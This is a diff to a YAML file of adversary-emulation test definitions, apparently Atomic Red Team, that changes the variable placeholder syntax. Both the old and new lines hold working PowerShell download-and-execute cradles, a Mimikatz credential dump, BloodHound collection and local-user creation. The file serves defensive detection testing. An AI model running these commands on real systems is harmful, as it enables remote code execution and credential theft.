@@ -19,7 +19,7 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('${mimurl}'); Invoke-Mimikatz -DumpCreds"
+      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
 
 - name: BloodHound
   description: |
@@ -37,7 +37,7 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('${bloodurl}'); Get-BloodHoundData"
+      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{bloodurl}'); Get-BloodHoundData"
 
 - name: Obfuscation Tests
   description: |
@@ -114,7 +114,7 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      New-LocalUser -FullName '${full_name}' -Name '${user_name}' -Password ${password} ‑Description '${description}'
+      New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} ‑Description '#{description}'
 
 - name: Powershell MsXml COM object
   description: |
@@ -134,7 +134,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      powershell.exe -exec bypass -windowstyle hidden -noprofile “$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open(‘GET’,’${url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText”
+      powershell.exe -exec bypass -windowstyle hidden -noprofile “$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open(‘GET’,’#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText”
 
 - name: Powershell XML requests
   description: |
@@ -153,7 +153,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -windowstyle hidden -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('${url}');$Xml.command.a.execute | IEX"
+      "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -windowstyle hidden -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
 
 - name: Powershell invoke mshta.exe download
   description: |
@@ -172,7 +172,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      "C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject("script:${url}").Exec();close()"
+      "C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject("script:#{url}").Exec();close()"
 
 - name: Powershell Invoke-DownloadCradle
   description: |
